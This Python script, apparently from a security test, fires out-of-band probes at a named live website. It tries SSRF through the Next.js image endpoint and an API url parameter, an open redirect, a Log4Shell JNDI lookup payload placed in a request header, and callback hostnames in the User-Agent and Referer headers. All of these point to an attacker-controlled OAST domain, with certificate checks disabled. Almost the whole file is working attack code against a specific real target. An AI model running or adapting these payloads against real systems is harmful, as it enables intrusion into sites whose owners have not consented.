#!/usr/bin/env python3
"""Controlled OOB test: fire TEST host into real target sinks; NEVER fire CONTROL host."""
import ssl, urllib.request, time
ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
BASE="https://www.infinitycapital.bh"
IMG="https://images.ctfassets.net/yts1dx0j7jj5/1GCT0vyjqmOwm2OL1YVpD1/2ab55f8b5189afa153eac5cb97f7f6d4/Ahmed_Taleb_updated-min.jpg"
TEST ="oob272e62d731df.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
CTRL ="oob7c720e257d4d.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"  # NEVER sent to target
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome Safari/537.36"

def get(url, timeout=20, hdrs=None):
    h={"User-Agent":UA,"Accept":"*/*"}
    if hdrs: h.update(hdrs)
    try:
        with urllib.request.urlopen(urllib.request.Request(url,headers=h),context=ctx,timeout=timeout) as r:
            return r.status, len(r.read())
    except urllib.error.HTTPError as e:
        return e.code, len(e.read())
    except Exception as e:
        return 0, str(e)[:60]

import urllib.parse
cases = [
 ("nextimage-url-ssrf",  "/_next/image?url="+urllib.parse.quote("http://"+TEST+"/ssrf",safe="")+"&w=1080&q=75", None),
 ("nextimage-url-dns",   "/_next/image?url="+urllib.parse.quote("http://"+TEST+"/dns",safe="")+"&w=1080&q=75", None),
 ("nextimage-url-plain", "/_next/image?url="+TEST+"&w=1080&q=75", None),
 ("nextimage-w",         "/_next/image?url="+urllib.parse.quote(IMG,safe="")+"&w="+urllib.parse.quote(TEST,safe="")+"&q=75", None),
 ("nextimage-q",         "/_next/image?url="+urllib.parse.quote(IMG,safe="")+"&w=1080&q="+urllib.parse.quote(TEST,safe=""), None),
 ("home-ref",            "/?ref="+urllib.parse.quote(TEST,safe=""), None),
 ("api-url",             "/api/?url="+urllib.parse.quote("http://"+TEST+"/api",safe=""), None),
 ("404-redirect",        "/404?next="+urllib.parse.quote("http://"+TEST+"/redir",safe=""), None),
 ("header-jndi",         "/", {"X-Api-Version":"${jndi:ldap://"+TEST+"/j}"}),
 ("header-ua",           "/", {"User-Agent":UA+" "+TEST}),
 ("header-referer",      "/", {"Referer":"http://"+TEST+"/ref"}),
]
print("Firing TEST host =", TEST)
for name, path, hdrs in cases:
    c,l = get(BASE+path, hdrs=hdrs)
    print(f"  {name:22s} -> {c} len={l}")
    time.sleep(0.4)
print("\nCONTROL host (NEVER sent to target):", CTRL)
